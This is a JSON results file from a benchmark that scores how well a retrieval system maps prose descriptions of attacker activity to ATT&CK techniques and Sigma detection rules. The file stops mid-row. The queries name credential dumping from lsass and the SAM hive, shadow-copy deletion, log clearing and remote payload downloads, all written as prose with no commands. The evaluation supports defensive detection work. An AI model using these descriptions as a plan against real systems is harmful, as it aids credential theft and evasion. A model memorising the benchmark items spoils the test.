@@ -1,0 +1,3424 @@
+{
+  "meta": {
+    "label": "R0-vector",
+    "split": {
+      "name": "dev",
+      "sha": "f1ee9a08ce2a"
+    },
+    "golden_sha": "b0695a44d0d4",
+    "embedding_model": "jinaai/jina-embeddings-v2-base-en",
+    "lexical": false,
+    "technique_parts": false,
+    "index": {
+      "technique_part": 3525,
+      "technique": 697,
+      "sigma_rule": 3144
+    },
+    "deep": 20
+  },
+  "summary": {
+    "text->attack": {
+      "n": 40,
+      "recall@5": 0.925,
+      "recall@10": 0.95,
+      "mrr": 0.7176893939393939,
+      "ndcg@5": 0.7020151156244767
+    },
+    "text->sigma": {
+      "n": 40,
+      "recall@5": 0.925,
+      "recall@10": 0.925,
+      "mrr": 0.7098397435897436,
+      "ndcg@5": 0.5924803704962713
+    },
+    "alert->attack": {
+      "n": 20,
+      "recall@5": 0.35,
+      "recall@10": 0.6,
+      "mrr": 0.26978174603174604,
+      "ndcg@5": 0.26617329093938824
+    },
+    "alert->sigma": {
+      "n": 20,
+      "recall@5": 0.65,
+      "recall@10": 0.65,
+      "mrr": 0.5069047619047619,
+      "ndcg@5": 0.3133977925259295
+    },
+    "command->attack": {
+      "n": 19,
+      "recall@5": 0.42105263157894735,
+      "recall@10": 0.5263157894736842,
+      "mrr": 0.343705755617113,
+      "ndcg@5": 0.34993222707249777
+    },
+    "fields->sigma": {
+      "n": 20,
+      "recall@5": 0.5,
+      "recall@10": 0.6,
+      "mrr": 0.44201388888888893,
+      "ndcg@5": 0.24468254938449271
+    }
+  },
+  "rows": [
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p01",
+      "query": "A process opens a handle to lsass.exe with full access and writes a memory dump of it to disk",
+      "kind": "technique",
+      "gold": [
+        "T1003.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1003.001",
+        "T1055.014",
+        "T1204.002",
+        "T1546.012",
+        "T1055.013"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p01",
+      "query": "A process opens a handle to lsass.exe with full access and writes a memory dump of it to disk",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1003.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 140,
+      "top": [
+        "9bd012ee-0dff-44d7-84a0-aa698cfd87a3",
+        "69ca12af-119d-44ed-b50f-a47af0ebc364",
+        "4be8b654-0c01-4c9d-a10c-6b28467fc651",
+        "c3e76af5-4ce0-4a14-9c9a-25ceb8fda182",
+        "a5a2d357-1ab8-4675-a967-ef9990a59391"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p02",
+      "query": "PowerShell started with a long base64 encoded argument and a hidden window",
+      "kind": "technique",
+      "gold": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6131471927654584,
+      "n_relevant": 2,
+      "top": [
+        "T1059.001",
+        "T1564.010",
+        "T1546.013",
+        "T1134.004",
+        "T1027.003"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p02",
+      "query": "PowerShell started with a long base64 encoded argument and a hidden window",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 377,
+      "top": [
+        "fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c",
+        "88f680b8-070e-402c-ae11-d2914f2257f1",
+        "6385697e-9f1b-40bd-8817-f4a91f40508e",
+        "e32d4572-9826-4738-b651-95fa63747e8a",
+        "fb843269-508c-4b76-8b8d-88679db22ce7"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p03",
+      "query": "A new value is written under the CurrentVersion Run registry key so a program starts at every user logon",
+      "kind": "technique",
+      "gold": [
+        "T1547.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1037.001",
+        "T1547.014",
+        "T1547",
+        "T1037.003"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p03",
+      "query": "A new value is written under the CurrentVersion Run registry key so a program starts at every user logon",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1547.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.830419897363192,
+      "n_relevant": 53,
+      "top": [
+        "20f0ee37-5942-4e45-b7d5-c5b5db9df5cd",
+        "de587dce-915e-4218-aac4-835ca6af6f70",
+        "8fbe98a8-8f9d-44f8-aa71-8c572e29ef06",
+        "02ee49e2-e294-4d0f-9278-f5b3212fc588",
+        "9c226817-8dc9-46c2-a58d-66655aafd7dc"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p04",
+      "query": "A scheduled task is created from the command line that runs a script every few minutes",
+      "kind": "technique",
+      "gold": [
+        "T1053.005"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1053",
+        "T1053.005",
+        "T1053.003",
+        "T1053.006",
+        "T1053.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p04",
+      "query": "A scheduled task is created from the command line that runs a script every few minutes",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1053.005"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 50,
+      "top": [
+        "970823b7-273b-460a-8afc-3a6811998529",
+        "92626ddd-662c-49e3-ac59-f6535f12d189",
+        "6b14bac8-3e3a-4324-8109-42f0546a347f",
+        "81325ce1-be01-4250-944f-b4789644556f",
+        "f2c64357-b1d2-41b7-849f-34d2682c0fad"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p05",
+      "query": "A new Windows service is installed whose binary sits in a user writable temp folder",
+      "kind": "technique",
+      "gold": [
+        "T1543.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 3,
+      "ndcg5": 0.5,
+      "n_relevant": 1,
+      "top": [
+        "T1574.010",
+        "T1574.005",
+        "T1543.003",
+        "T1546.016",
+        "T1547.012"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p05",
+      "query": "A new Windows service is installed whose binary sits in a user writable temp folder",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1543.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 3,
+      "ndcg5": 0.3156484524795145,
+      "n_relevant": 51,
+      "top": [
+        "a07f0359-4c90-4dc4-a681-8ffea40b4f47",
+        "883faa95-175a-4e22-8181-e5761aeb373c",
+        "17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8",
+        "85ff530b-261d-48c6-a441-facaa2e81e48",
+        "aa3a6f94-890e-4e22-b634-ffdfd54792cc"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p06",
+      "query": "A registry change turns off the Windows event log service so activity is no longer recorded",
+      "kind": "technique",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1685.001",
+        "T1685.005",
+        "T1112",
+        "T1547.004",
+        "T1546.001"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p06",
+      "query": "A registry change turns off the Windows event log service so activity is no longer recorded",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.8539316501572937,
+      "n_relevant": 192,
+      "top": [
+        "8839e550-52d7-4958-9f2f-e13c1e736838",
+        "919f2ef0-be2d-4a7a-b635-eb2b41fde044",
+        "2f78da12-f7c7-430b-8b19-a28f269b77a3",
+        "ba226dcf-d390-4642-b9af-b534872f1156",
+        "d7b81144-b866-48a4-9bcc-275dc69d870e"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p07",
+      "query": "wevtutil is run to clear the Security event log",
+      "kind": "technique",
+      "gold": [
+        "T1685.005"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1685.005",
+        "T1685.004",
+        "T1070.007",
+        "T1685.001",
+        "T1685.006"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p07",
+      "query": "wevtutil is run to clear the Security event log",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.005"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 192,
+      "top": [
+        "d99b79d2-0a6f-4f46-ad8b-260b6e17f982",
+        "cc36992a-4671-4f21-a91d-6c2b72a2edf5",
+        "a62b37e0-45d3-48d9-a517-90c1a1b0186b",
+        "100ef69e-3327-481c-8e5c-6d80d9507556",
+        "3fcc9b35-39e4-44c0-a2ad-9e82b6902b31"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p08",
+      "query": "vssadmin deletes all volume shadow copies so files cannot be restored",
+      "kind": "technique",
+      "gold": [
+        "T1490"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1490",
+        "T1003.003",
+        "T1006",
+        "T1485",
+        "T1070.009"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p08",
+      "query": "vssadmin deletes all volume shadow copies so files cannot be restored",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1490"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 23,
+      "top": [
+        "87df9ee1-5416-453a-8a08-e8d4a51e9ce1",
+        "c947b146-0abc-4c87-9c64-b17e9d7274a2",
+        "37774c23-25a1-4adb-bb6d-8bb9fd59c0f8",
+        "48bfd177-7cf2-412b-ad77-baf923489e82",
+        "f57f8d16-1f39-4dcb-a604-6c73d9b54b3d"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p09",
+      "query": "whoami and net group commands run in quick succession by a normal user to see who is an administrator",
+      "kind": "technique",
+      "gold": [
+        "T1033",
+        "T1069.002",
+        "T1069.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.2960819109658652,
+      "n_relevant": 3,
+      "top": [
+        "T1098.007",
+        "T1033",
+        "T1201",
+        "T1037.003",
+        "T1204"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p09",
+      "query": "whoami and net group commands run in quick succession by a normal user to see who is an administrator",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1033",
+        "T1069.002",
+        "T1069.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.7227265726449519,
+      "n_relevant": 53,
+      "top": [
+        "bd8b828d-0dca-48e1-8a63-8a58ecf2644f",
+        "97a80ec7-0e2f-4d05-9ef4-65760e634f6b",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "5b768e71-86f2-4879-b448-81061cbae951",
+        "ad720b90-25ad-43ff-9b5e-5c841facc8e5"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p10",
+      "query": "rundll32 executes a function exported by a DLL dropped in a user profile folder",
+      "kind": "technique",
+      "gold": [
+        "T1218.011"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.011",
+        "T1574.012",
+        "T1546.009",
+        "T1129",
+        "T1546.010"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p10",
+      "query": "rundll32 executes a function exported by a DLL dropped in a user profile folder",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1218.011"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.830419897363192,
+      "n_relevant": 216,
+      "top": [
+        "5cdb711b-5740-4fb2-ba88-f7945027afac",
+        "e593cf51-88db-4ee1-b920-37e89012a3c9",
+        "9248c7e1-2bf3-4661-a22c-600a8040b446",
+        "c3a99af4-35a9-4668-879e-c09aeb4f2bdf",
+        "32b96012-7892-429e-b26c-ac2bf46066ff"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p11",
+      "query": "mshta launched to run a script fetched from a remote web server",
+      "kind": "technique",
+      "gold": [
+        "T1218.005"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.005",
+        "T1216.002",
+        "T1218.001",
+        "T1216.001",
+        "T1059.005"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p11",
+      "query": "mshta launched to run a script fetched from a remote web server",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1218.005"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6548086577531307,
+      "n_relevant": 216,
+      "top": [
+        "b98d0db6-511d-45de-ad02-e82a98729620",
+        "cea72823-df4d-4567-950c-0b579eaf0846",
+        "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
+        "67f113fa-e23d-4271-befa-30113b3e08b1",
+        "9df0dd3a-1a5c-47e3-a2bc-30ed177646a0"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p12",
+      "query": "A Word document opened by the user spawns cmd.exe which then starts PowerShell",
+      "kind": "technique",
+      "gold": [
+        "T1204.002",
+        "T1566.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 4,
+      "ndcg5": 0.2640681225725909,
+      "n_relevant": 2,
+      "top": [
+        "T1221",
+        "T1137.001",
+        "T1137.002",
+        "T1204.002",
+        "T1218.014"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p12",
+      "query": "A Word document opened by the user spawns cmd.exe which then starts PowerShell",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1204.002",
+        "T1566.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6992148198508501,
+      "n_relevant": 65,
+      "top": [
+        "e1693bc8-7168-4eab-8718-cdcaa68a1738",
+        "aa3a6f94-890e-4e22-b634-ffdfd54792cc",
+        "1027d292-dd87-4a1a-8701-2abe04d7783c",
+        "438025f9-5856-4663-83f7-52f878a70a50",
+        "e36941d0-c0f0-443f-bc6f-cb2952eb69ea"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p13",
+      "query": "A program running from a user temp folder makes an outbound connection to an external address on TCP port 4444",
+      "kind": "technique",
+      "gold": [
+        "T1571"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1090.002",
+        "T1204",
+        "T1080",
+        "T1090.001",
+        "T1204.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p13",
+      "query": "A program running from a user temp folder makes an outbound connection to an external address on TCP port 4444",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1571"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 5,
+      "top": [
+        "7b434893-c57d-4f41-908d-6a17bf1ae98f",
+        "992a6cae-db6a-43c8-9cec-76d7195c96fc",
+        "e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97",
+        "0afecb6e-6223-4a82-99fb-bf5b981e92a5",
+        "a35f5a72-f347-4e36-8895-9869b0d5fc6d"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p14",
+      "query": "Commands are executed on another host by copying a file to its admin share and starting a service remotely",
+      "kind": "technique",
+      "gold": [
+        "T1021.002",
+        "T1569.002"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 4,
+      "ndcg5": 0.2640681225725909,
+      "n_relevant": 2,
+      "top": [
+        "T1204.004",
+        "T1105",
+        "T1219",
+        "T1569.002",
+        "T1204.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p14",
+      "query": "Commands are executed on another host by copying a file to its admin share and starting a service remotely",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1021.002",
+        "T1569.002"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.21398626473452756,
+      "n_relevant": 119,
+      "top": [
+        "74a2b202-73e0-4693-9a3a-9d36146d0775",
+        "7b836d7f-179c-4ba4-90a7-a7e60afb48e6",
+        "e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97",
+        "b5522a23-82da-44e5-9c8b-e10ed8955f88",
+        "95e60a2b-4705-444b-b7da-ba0ea81a3ee2"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p15",
+      "query": "reg save is used to export the SAM and SYSTEM hives to a file",
+      "kind": "technique",
+      "gold": [
+        "T1003.002"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1003.002",
+        "T1003.004",
+        "T1552.002",
+        "T1218.010",
+        "T1012"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p15",
+      "query": "reg save is used to export the SAM and SYSTEM hives to a file",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1003.002"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.38356636737133565,
+      "n_relevant": 140,
+      "top": [
+        "82880171-b475-4201-b811-e9c826cd5eaa",
+        "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+        "4e87b8e2-2ee9-4b2a-a715-4727d297ece0",
+        "f0e53e89-8d22-46ea-9db5-9d4796ee2f8a",
+        "973ef012-8f1a-4c40-93b4-7e659a5cd17f"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p16",
+      "query": "Code is written into the memory of another running process and executed there to hide inside it",
+      "kind": "technique",
+      "gold": [
+        "T1055"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 6,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1055.003",
+        "T1055.012",
+        "T1055.009",
+        "T1055.011",
+        "T1055.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p16",
+      "query": "Code is written into the memory of another running process and executed there to hide inside it",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1055"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 3,
+      "ndcg5": 0.30078518014914984,
+      "n_relevant": 40,
+      "top": [
+        "5cd16c8f-44a6-4654-81e7-a84d6db507d4",
+        "6640f31c-01ad-49b5-beb5-83498a5cd8bd",
+        "d2b7a134-9c3e-4f8a-b56d-e0c1f8a29b47",
+        "cec8e918-30f7-4e2d-9bfa-a59cc97ae60f",
+        "85d23b42-9a9d-4f8f-b3d7-d2733c1d58f5"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p17",
+      "query": "A signed legitimate executable loads an unsigned DLL sitting in the same folder",
+      "kind": "technique",
+      "gold": [
+        "T1574.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1574.001",
+        "T1553.003",
+        "T1055.001",
+        "T1218.011",
+        "T1036.001"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p17",
+      "query": "A signed legitimate executable loads an unsigned DLL sitting in the same folder",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1574.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6608397947263839,
+      "n_relevant": 104,
+      "top": [
+        "b5de0c9a-6f19-43e0-af4e-55ad01f550af",
+        "948a0953-f287-4806-bbcb-3b2e396df89f",
+        "6b98b92b-4f00-4f62-b4fe-4d1920215771",
+        "8289bf8c-4aca-4f5a-9db3-dc3d7afe5c10",
+        "273a8dd8-3742-4302-bcc7-7df5a80fe425"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p18",
+      "query": "A WMI event filter and consumer are registered so a command runs automatically when the trigger fires",
+      "kind": "technique",
+      "gold": [
+        "T1546.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1546.003",
+        "T1546",
+        "T1205.002",
+        "T1047",
+        "T1547.010"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p18",
+      "query": "A WMI event filter and consumer are registered so a command runs automatically when the trigger fires",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1546.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.830419897363192,
+      "n_relevant": 60,
+      "top": [
+        "05936ce2-ee05-4dae-9d03-9a391cf2d2c6",
+        "ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e",
+        "493fb4ab-cdcc-4c4f-818c-0e363bd1e4bb",
+        "0b7889b4-5577-4521-a60a-3376ee7f9f7b",
+        "b439f47d-ef52-4b29-9a2f-57d8a96cb6b8"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p19",
+      "query": "certutil is used to download a file from a URL and decode it",
+      "kind": "technique",
+      "gold": [
+        "T1105",
+        "T1140"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6131471927654584,
+      "n_relevant": 2,
+      "top": [
+        "T1140",
+        "T1555.003",
+        "T1649",
+        "T1553.004",
+        "T1588.004"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p19",
+      "query": "certutil is used to download a file from a URL and decode it",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1105",
+        "T1140"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6608397947263839,
+      "n_relevant": 84,
+      "top": [
+        "cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7",
+        "19b08b1c-861d-4e75-a1ef-ea0c1baf202b",
+        "4480827a-9799-4232-b2c4-ccc6c4e9e12b",
+        "b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a",
+        "42a5f1e7-9603-4f6d-97ae-3f37d130d794"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes:p20",
+      "query": "A copy of a built-in system utility is renamed and run from an unusual directory",
+      "kind": "technique",
+      "gold": [
+        "T1036.003",
+        "T1036.005"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6131471927654584,
+      "n_relevant": 2,
+      "top": [
+        "T1036.003",
+        "T1036.006",
+        "T1574.008",
+        "T1574.005",
+        "T1218.004"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes:p20",
+      "query": "A copy of a built-in system utility is renamed and run from an unusual directory",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1036.003",
+        "T1036.005"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.8687949224876582,
+      "n_relevant": 81,
+      "top": [
+        "fff9d2b7-e11c-4a69-93d3-40ef66189767",
+        "f5d19838-41b5-476c-98d8-ba8af4929ee2",
+        "4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67",
+        "79b06761-465f-4f88-9ef2-150e24d3d737",
+        "1cf465a1-2609-4c15-9b66-c32dbe4bfd67"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q01",
+      "query": "A new local user account is created with net user and then added to the Administrators group",
+      "kind": "technique",
+      "gold": [
+        "T1136.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1098.007",
+        "T1136.001",
+        "T1078.003",
+        "T1136.002",
+        "T1037.003"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q01",
+      "query": "A new local user account is created with net user and then added to the Administrators group",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1136.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 3,
+      "ndcg5": 0.4468535299918563,
+      "n_relevant": 23,
+      "top": [
+        "c265cf08-3f99-46c1-8d59-328247057d57",
+        "ad720b90-25ad-43ff-9b5e-5c841facc8e5",
+        "cd219ff3-fa99-45d4-8380-a7d15116c6dc",
+        "ffa28e60-bdb1-46e0-9f82-05f7a61cc06e",
+        "b9f0e6f5-09b4-4358-bae4-08408705bd5c"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q02",
+      "query": "One source address fails to log in against hundreds of different accounts using the same common password",
+      "kind": "technique",
+      "gold": [
+        "T1110.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1110.001",
+        "T1110.003",
+        "T1110.004",
+        "T1110",
+        "T1078"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q02",
+      "query": "One source address fails to log in against hundreds of different accounts using the same common password",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1110.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.34519134224686937,
+      "n_relevant": 26,
+      "top": [
+        "9eb99343-d336-4020-a3cd-67f3819e68ee",
+        "1883444f-084b-419b-ac62-e0d0c5b3693f",
+        "5b768e71-86f2-4879-b448-81061cbae951",
+        "e3c6d245-7b8f-4e2a-c17f-a9d0e5b38f62",
+        "2b7d6fc0-71ac-4cf7-8ed1-b5788ee5257a"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q03",
+      "query": "A domain user requests Kerberos service tickets for many service accounts in a short time so they can be cracked offline",
+      "kind": "technique",
+      "gold": [
+        "T1558.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1558",
+        "T1558.003",
+        "T1550.003",
+        "T1558.001",
+        "T1136.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q03",
+      "query": "A domain user requests Kerberos service tickets for many service accounts in a short time so they can be cracked offline",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1558.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6548086577531307,
+      "n_relevant": 20,
+      "top": [
+        "d04ae2b8-ad54-4de0-bd87-4bc1da66aa59",
+        "6a53d871-682d-40b6-83e0-b7c1a6c4e3a5",
+        "496a0e47-0a33-4dca-b009-9e6ca3591f39",
+        "caa9a802-8bd8-4b9e-a5cd-4d6221670219",
+        "3e2f1b2c-4d5e-11ee-be56-0242ac120002"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q04",
+      "query": "A VBA macro in a spreadsheet launches a shell command as soon as the file is opened",
+      "kind": "technique",
+      "gold": [
+        "T1059.005",
+        "T1204.002"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.8503449055347546,
+      "n_relevant": 2,
+      "top": [
+        "T1059.005",
+        "T1564.007",
+        "T1137.001",
+        "T1204.004",
+        "T1204.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q04",
+      "query": "A VBA macro in a spreadsheet launches a shell command as soon as the file is opened",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1059.005",
+        "T1204.002"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 5,
+      "ndcg5": 0.13120507751234178,
+      "n_relevant": 370,
+      "top": [
+        "b1c50487-1967-4315-a026-6491686d860e",
+        "8c31f563-f9a7-450c-bfa8-35f8f32f1f61",
+        "91174a41-dc8f-401b-be89-7bfc140612a0",
+        "0e29e3a7-1ad8-40aa-b691-9f82ecd33d66",
+        "e6ce8457-68b1-485b-9bdd-3c2b5d679aa9"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q05",
+      "query": "bitsadmin creates a transfer job that downloads a file from an external URL",
+      "kind": "technique",
+      "gold": [
+        "T1197"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1197",
+        "T1027.006",
+        "T1048",
+        "T1537",
+        "T1570"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q05",
+      "query": "bitsadmin creates a transfer job that downloads a file from an external URL",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1197"
